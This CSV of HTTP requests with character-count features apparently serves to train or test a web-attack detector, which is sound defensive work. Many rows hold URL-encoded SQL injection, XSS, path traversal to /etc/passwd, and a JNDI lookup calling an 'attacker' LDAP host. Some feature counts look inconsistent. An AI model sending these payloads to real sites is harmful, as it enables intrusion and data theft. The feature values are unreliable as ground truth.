method,path,body,single_q,double_q,dashes,braces,spaces,badwords
GET,/sports,,0,0,0,0,0,0
GET,/products/list,,0,0,0,0,0,0
GET,/user/wishlist/add?id=98,,0,0,0,0,0,0
POST,/,uemail=test@example.com,0,0,0,0,0,0
POST,/user/cart/add?id=45,,0,0,0,0,0,0
GET,/projects/view?id=8?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/stocks/market,,0,0,0,0,0,0
POST,/blog/category/tech,uname=test&pass=test,0,0,0,0,0,0
POST,/api/v1/users?page=2,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/admin/users,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/appointments/book,,0,0,0,0,0,0
POST,/weather/today,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/books,,0,0,0,0,0,0
POST,/docs/setup,id=55,0,0,0,0,0,0
POST,/static/theme.css?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/products/view?id=1?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
GET,/university/course?id=20,,0,0,0,0,0,0
POST,/billing/invoice?id=55,product=123&type=info,0,0,0,0,0,0
POST,/index.html?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/search?cat=electronics?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
POST,/api/v1/users/1,uemail=test@example.com,0,0,0,0,0,0
POST,/gallery,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/books?q=sleep%285%29,,0,0,0,1,0,2
POST,/feedback/submit,,0,0,0,0,0,0
GET,/checkout/address?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/settings/profile,,0,0,0,0,0,0
GET,/events/upcoming?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
POST,/user,comment=Nice+product,0,0,0,0,1,0
GET,/orders,,0,0,0,0,0,0
GET,/docs/examples?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
POST,/billing?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/blog/post3,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/api/v1/orders?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/docs/introduction,,0,0,0,0,0,0
POST,/contact.php,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/tickets/open,,0,0,0,0,0,0
POST,/music/playlist?id=4?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
GET,/restaurants,,0,0,0,0,0,0
POST,/checkout,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/movies/details?id=9,,0,0,0,0,0,0
GET,/user/messages?q=admin%27+--,,1,0,1,0,1,0
GET,/books?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/projects/view?id=8?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
POST,/page/2?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
POST,/blog/category/security,uname=test&pass=test,0,0,0,0,0,0
POST,/forum/post?id=3,uemail=test@example.com,0,0,0,0,0,0
POST,/user/wishlist?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
GET,/appointments/book,,0,0,0,0,0,0
POST,/subscriptions?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,3
GET,/page/2,,0,0,0,0,0,0
GET,/stocks/company?id=TCS,,0,0,0,0,0,0
POST,/downloads/manual,comment=Nice+product,0,0,0,0,1,0
POST,/checkout/address,,0,0,0,0,0,0
POST,/products.html,comment=Nice+product,0,0,0,0,1,0
POST,/settings/preferences,uemail=test@example.com,0,0,0,0,0,0
GET,/account,,0,0,0,0,0,0
POST,/admin/reports,uname=test&pass=test,0,0,0,0,0,0
POST,/travel/hotels?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/news/local,,0,0,0,0,0,0
GET,/user/profile,,0,0,0,0,0,0
GET,/about.html,,0,0,0,0,0,0
GET,/weather/today,,0,0,0,0,0,0
POST,/assets/images/banner.jpg,comment=Nice+product,0,0,0,0,1,0
GET,/api/v3/notifications?q=%27%3B+DROP+TABLE+users%3B+--,,1,0,1,0,4,2
GET,/static/script.js,,0,0,0,0,0,1
POST,/organization/team,,0,0,0,0,0,0
POST,/terms-and-conditions,,0,0,0,0,0,0
GET,/static/script.js,,0,0,0,0,0,1
GET,/playlists/trending?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
GET,/library/books,,0,0,0,0,0,0
GET,/user/profile?id=3?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
GET,/sports/football?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
POST,/notifications/settings,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/pricing.html?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/home.php?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,4,0,0,2,0,6
GET,/movies,,0,0,0,0,0,0
POST,/books/bestsellers,product=123&type=info,0,0,0,0,0,0
POST,/account/downloads,uname=test&pass=test,0,0,0,0,0,0
POST,/tickets/view?id=44?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
GET,/library/book?id=10?q=admin%27+--,,1,0,1,0,1,0
GET,/category/fashion,,0,0,0,0,0,0
GET,/blog/post3?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/newsfeed?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/shop,,0,0,0,0,0,0
POST,/news/trending?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
POST,/forum/category/coding,uemail=test@example.com,0,0,0,0,0,0
GET,/products/filter?price=high,,0,0,0,0,0,0
GET,/orders/list,,0,0,0,0,0,0
POST,/billing/history,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/api/v2/login,product=123&type=info,0,0,0,0,0,0
POST,/travel/flights,uemail=test@example.com,0,0,0,0,0,0
GET,/books/read?id=100?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
GET,/blog/post2,,0,0,0,0,0,0
GET,/search?page=2,,0,0,0,0,0,0
GET,/subscriptions/manage,,0,0,0,0,0,1
POST,/privacy-policy,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/settings?q=sleep%285%29,,0,0,0,1,0,2
POST,/inbox/messages,id=55,0,0,0,0,0,0
GET,/news/business,,0,0,0,0,0,0
GET,/blog/category/tech?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
POST,/feedback/form,comment=Nice+product,0,0,0,0,1,0
POST,/api/v2/checkout?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
POST,/projects/view?id=8,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/organization/team,,0,0,0,0,0,0
GET,/dashboard?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
GET,/news/business?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
GET,/feedback/submit,,0,0,0,0,0,0
GET,/travel/offers,,0,0,0,0,0,0
GET,/user/messages,,0,0,0,0,0,0
GET,/billing/payment-methods,,0,0,0,0,0,0
POST,/docs/examples?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/university/course?id=20,,0,0,0,0,0,0
POST,/downloads/manual?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
GET,/store/phones,,0,0,0,0,0,0
POST,/contact.php,uemail=test@example.com,0,0,0,0,0,0
POST,/api/v3/notifications?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
GET,/blog/post1?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
POST,/blog/post3?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/user/profile?id=3?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
POST,/library?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/downloads?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
GET,/feedback?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
GET,/products/list?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
POST,/music,uname=test&pass=test,0,0,0,0,0,0
POST,/blog/post1?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
GET,/user/wishlist,,0,0,0,0,0,0
GET,/products/trending?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
GET,/checkout,,0,0,0,0,0,0
GET,/inbox,,0,0,0,0,0,0
GET,/shop,,0,0,0,0,0,0
POST,/feedback/submit,comment=Nice+product,0,0,0,0,1,0
POST,/help/how-to-order,comment=Nice+product,0,0,0,0,1,0
POST,/checkout,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/settings/security,,0,0,0,0,0,0
GET,/auth/verify-email,,0,0,0,0,0,0
POST,/appointments?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/weather/week,,0,0,0,0,0,0
POST,/restaurants/view?id=23?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
POST,/blog/post1,product=123&type=info,0,0,0,0,0,0
POST,/admin/logs,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/sports/cricket,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/events,,0,0,0,0,0,0
POST,/forum/post?id=2?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
GET,/careers,,0,0,0,0,0,0
GET,/user/orders?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
GET,/assets/images/logo.png,,0,0,0,0,0,0
POST,/auth/reset-password?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,data=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,6,0,2,0,8,4
POST,/settings/preferences?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,4,0,0,2,0,6
GET,/subscribe,,0,0,0,0,0,0
POST,/api/v2/auth?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/news/local,,0,0,0,0,0,0
GET,/auth/reset-password?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/dashboard,,0,0,0,0,0,0
GET,/forum/category/tech,,0,0,0,0,0,0
POST,/products/reviews?id=10,uemail=test@example.com,0,0,0,0,0,0
POST,/account/security?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
POST,/account?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
POST,/restaurants,uname=test&pass=test,0,0,0,0,0,0
POST,/category/sports,product=123&type=info,0,0,0,0,0,0
GET,/forum/post?id=3,,0,0,0,0,0,0
POST,/languages/hindi,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/events/upcoming,,0,0,0,0,0,0
GET,/faq,,0,0,0,0,0,0
GET,/restaurants/nearby,,0,0,0,0,0,0
GET,/store/laptops,,0,0,0,0,0,0
POST,/books/bestsellers?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
GET,/products,,0,0,0,0,0,0
GET,/orders/detail?id=100?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/blog/post2,,0,0,0,0,0,0
POST,/api/v2/auth?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
POST,/crypto/market,,0,0,0,0,0,0
GET,/library,,0,0,0,0,0,0
GET,/account/security,,0,0,0,0,0,0
GET,/organization/team,,0,0,0,0,0,0
POST,/news/world?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
POST,/support/ticket,,0,0,0,0,0,0
POST,/pricing.html,uemail=test@example.com,0,0,0,0,0,0
POST,/checkout,comment=Nice+product,0,0,0,0,1,0
POST,/docs/tutorials,comment=Nice+product,0,0,0,0,1,0
GET,/products.html,,0,0,0,0,0,0
POST,/forum/threads?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
GET,/billing/history?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
GET,/weather/week,,0,0,0,0,0,0
GET,/locations/india?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
POST,/support/chat,uemail=test@example.com,0,0,0,0,0,0
POST,/settings/security,product=123&type=info,0,0,0,0,0,0
GET,/admin/dashboard,,0,0,0,0,0,0
POST,/inbox,id=55,0,0,0,0,0,0
POST,/user/messages,product=123&type=info,0,0,0,0,0,0
GET,/forum,,0,0,0,0,0,0
GET,/user/profile?id=3?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
POST,/products/reviews?id=10,,0,0,0,0,0,0
GET,/analytics,,0,0,0,0,0,0
POST,/events,uemail=test@example.com,0,0,0,0,0,0
POST,/forum?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,4,0,0,2,0,6
GET,/api/v2/login,,0,0,0,0,0,0
GET,/page/4,,0,0,0,0,0,0
GET,/feedback/form,,0,0,0,0,0,0
POST,/feedback,uemail=test@example.com,0,0,0,0,0,0
POST,/dashboard/overview,id=55,0,0,0,0,0,0
GET,/forum/category/general?q=sleep%285%29,,0,0,0,1,0,2
POST,/projects/view?id=8,uemail=test@example.com,0,0,0,0,0,0
GET,/user/notifications?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/help/how-to-order,,0,0,0,0,0,0
POST,/account/history,comment=Nice+product,0,0,0,0,1,0
POST,/auth/verify-email?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/docs,,0,0,0,0,0,0
GET,/docs/setup,,0,0,0,0,0,0
GET,/university/course?id=20?q=sleep%285%29,,0,0,0,1,0,2
POST,/offers/clearance,,0,0,0,0,0,0
POST,/user/wishlist?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/stocks/company?id=TCS,,0,0,0,0,0,0
POST,/forum/category/tech,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/auth/login,comment=Nice+product,0,0,0,0,1,0
GET,/blog/post3,,0,0,0,0,0,0
POST,/organization/team,,0,0,0,0,0,0
GET,/tickets/open,,0,0,0,0,0,0
POST,/settings/preferences,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/billing,,0,0,0,0,0,0
POST,/restaurants,comment=Nice+product,0,0,0,0,1,0
GET,/stocks/company?id=TCS,,0,0,0,0,0,0
POST,/search?cat=fashion?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/newsfeed,,0,0,0,0,0,0
POST,/user/profile?id=1,,0,0,0,0,0,0
POST,/billing?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/help/how-to-order,,0,0,0,0,0,0
POST,/blog/category/tech,uemail=test@example.com,0,0,0,0,0,0
GET,/books/read?id=100,,0,0,0,0,0,0
POST,/products?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/library?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
POST,/assets/css/main.css?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/home.php,,0,0,0,0,0,0
GET,/user/wishlist,,0,0,0,0,0,0
GET,/tickets/open,,0,0,0,0,0,0
GET,/admin/settings,,0,0,0,0,0,0
POST,/forum/post?id=3,uemail=test@example.com,0,0,0,0,0,0
POST,/sports/football,comment=Nice+product,0,0,0,0,1,0
POST,/languages/english?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/search?cat=electronics,,0,0,0,0,0,0
POST,/appointments,id=55,0,0,0,0,0,0
GET,/news/world,,0,0,0,0,0,0
POST,/orders/list,uname=test&pass=test,0,0,0,0,0,0
POST,/careers/jobs,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/forum/category/coding,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/products/filter?price=low,,0,0,0,0,0,0
GET,/admin/users?q=%27+OR+sleep%285%29%23,,1,0,0,1,2,2
POST,/restaurants/nearby,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/user/notifications?q=%27%3B+DROP+TABLE+users%3B+--,,1,0,1,0,4,2
GET,/faq,,0,0,0,0,0,0
GET,/forum/category/general?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
GET,/movies?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
GET,/privacy-policy,,0,0,0,0,0,0
POST,/category/sports,id=55,0,0,0,0,0,0
GET,/partners/login?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
GET,/index.html,,0,0,0,0,0,0
POST,/stocks/market,id=55,0,0,0,0,0,0
GET,/api/v3/settings,,0,0,0,0,0,0
POST,/gallery/videos?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/search?q=shoes,comment=Nice+product,0,0,0,0,1,0
POST,/tickets/view?id=44,comment=Nice+product,0,0,0,0,1,0
GET,/docs,,0,0,0,0,0,0
GET,/crypto,,0,0,0,0,0,0
GET,/crypto/market,,0,0,0,0,0,0
GET,/forum?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
POST,/user/profile?id=2,uname=test&pass=test,0,0,0,0,0,0
POST,/books/read?id=100,id=55,0,0,0,0,0,0
GET,/checkout/address,,0,0,0,0,0,0
POST,/admin/dashboard,comment=Nice+product,0,0,0,0,1,0
GET,/weather/city?name=Delhi,,0,0,0,0,0,0
GET,/news/latest,,0,0,0,0,0,0
POST,/help/contact,product=123&type=info,0,0,0,0,0,0
POST,/user/settings,id=55,0,0,0,0,0,0
GET,/pricing.html,,0,0,0,0,0,0
POST,/travel/flights?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/news/business,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/billing/invoice?id=55?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/gallery,,0,0,0,0,0,0
GET,/crypto/coin?id=ETH,,0,0,0,0,0,0
GET,/checkout/address,,0,0,0,0,0,0
GET,/checkout/address,,0,0,0,0,0,0
POST,/user/messages,product=123&type=info,0,0,0,0,0,0
POST,/gallery/videos,product=123&type=info,0,0,0,0,0,0
GET,/products,,0,0,0,0,0,0
GET,/music/songs,,0,0,0,0,0,0
POST,/products/trending,product=123&type=info,0,0,0,0,0,0
GET,/category/home-appliances,,0,0,0,0,0,0
POST,/search?page=3,id=55,0,0,0,0,0,0
GET,/travel/offers,,0,0,0,0,0,0
GET,/store/cameras?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
GET,/store,,0,0,0,0,0,0
POST,/user/profile?id=2?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,data=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,6,0,2,0,8,4
GET,/products.html?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/page/4,,0,0,0,0,0,0
POST,/feedback,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/tickets,id=55,0,0,0,0,0,0
GET,/search?page=2?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/services.html,,0,0,0,0,0,0
GET,/newsfeed,,0,0,0,0,0,0
GET,/account,,0,0,0,0,0,0
GET,/dashboard/overview,,0,0,0,0,0,0
GET,/category/electronics,,0,0,0,0,0,0
GET,/forum/category/coding,,0,0,0,0,0,0
POST,/dashboard/overview,product=123&type=info,0,0,0,0,0,0
GET,/blog/post3,,0,0,0,0,0,0
GET,/travel/flights,,0,0,0,0,0,0
POST,/restaurants,product=123&type=info,0,0,0,0,0,0
POST,/travel/flights?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/settings/profile,,0,0,0,0,0,0
GET,/playlists/trending,,0,0,0,0,0,0
GET,/subscriptions/manage?q=%22+AND+1%3D1+--,,0,1,1,0,3,2
POST,/search?page=1,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/dashboard/overview,,0,0,0,0,0,0
POST,/blog/category/tech,product=123&type=info,0,0,0,0,0,0
POST,/home.html?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
POST,/forum/category/general,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/projects/list,,0,0,0,0,0,0
POST,/assets/images/banner.jpg,uname=test&pass=test,0,0,0,0,0,0
POST,/reviews?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
POST,/unsubscribe?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/home.php?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
GET,/assets/images/banner.jpg,,0,0,0,0,0,0
POST,/careers/job?id=25,id=55,0,0,0,0,0,0
GET,/downloads/app,,0,0,0,0,0,0
POST,/careers,id=55,0,0,0,0,0,0
GET,/library,,0,0,0,0,0,0
POST,/forum,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/api/v2/register,,0,0,0,0,0,0
GET,/forum/category/tech?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
GET,/pricing.html,,0,0,0,0,0,0
POST,/pricing.html,id=55,0,0,0,0,0,0
GET,/music,,0,0,0,0,0,0
GET,/organization?q=%27%3B+DROP+TABLE+users%3B+--,,1,0,1,0,4,2
POST,/university,uname=test&pass=test,0,0,0,0,0,0
POST,/auth/logout,,0,0,0,0,0,0
GET,/appointments?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
GET,/languages,,0,0,0,0,0,0
GET,/products/filter?cat=women,,0,0,0,0,0,0
POST,/support?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/account/history,product=123&type=info,0,0,0,0,0,0
GET,/category/electronics,,0,0,0,0,0,0
GET,/dashboard/stats,,0,0,0,0,0,0
GET,/downloads/pdf?id=1,,0,0,0,0,0,0
POST,/inbox?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/products/reviews?id=10,id=55,0,0,0,0,0,0
GET,/university/course?id=20,,0,0,0,0,0,0
GET,/forum,,0,0,0,0,0,0
GET,/news/latest?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
POST,/forum/threads?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/languages/hindi?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/crypto/coin?id=ETH?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
GET,/stocks,,0,0,0,0,0,0
POST,/subscribe,product=123&type=info,0,0,0,0,0,0
GET,/dashboard/stats,,0,0,0,0,0,0
GET,/partners/login,,0,0,0,0,0,0
GET,/products/filter?cat=men?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
GET,/account?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
POST,/feedback,id=55,0,0,0,0,0,0
GET,/forum,,0,0,0,0,0,0
GET,/page/4,,0,0,0,0,0,0
POST,/settings/preferences,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/blog/archive/2023,,0,0,0,0,0,0
POST,/inbox/read?id=7,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/news?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
POST,/downloads/manual,id=55,0,0,0,0,0,0
GET,/tickets/open?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
POST,/docs,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/api/v1/users?q=%27+OR+sleep%285%29%23,,1,0,0,1,2,2
GET,/billing/payment-methods,,0,0,0,0,0,0
GET,/docs/setup,,0,0,0,0,0,0
POST,/feedback/submit?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
GET,/search?page=2,,0,0,0,0,0,0
GET,/user/orders?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/products/filter?price=high,,0,0,0,0,0,0
POST,/?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/careers/jobs,,0,0,0,0,0,0
GET,/university/course?id=20?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
GET,/api/v3/notifications,,0,0,0,0,0,0
GET,/checkout,,0,0,0,0,0,0
POST,/billing/invoice?id=55,uemail=test@example.com,0,0,0,0,0,0
POST,/products/filter?price=high,,0,0,0,0,0,0
POST,/promo/winter?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
GET,/shop/categories,,0,0,0,0,0,0
POST,/locations/india?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
GET,/docs/introduction?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/admin/dashboard?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/page/4,uname=test&pass=test,0,0,0,0,0,0
GET,/promo/summer?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
POST,/products/new,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/downloads/app,uname=test&pass=test,0,0,0,0,0,0
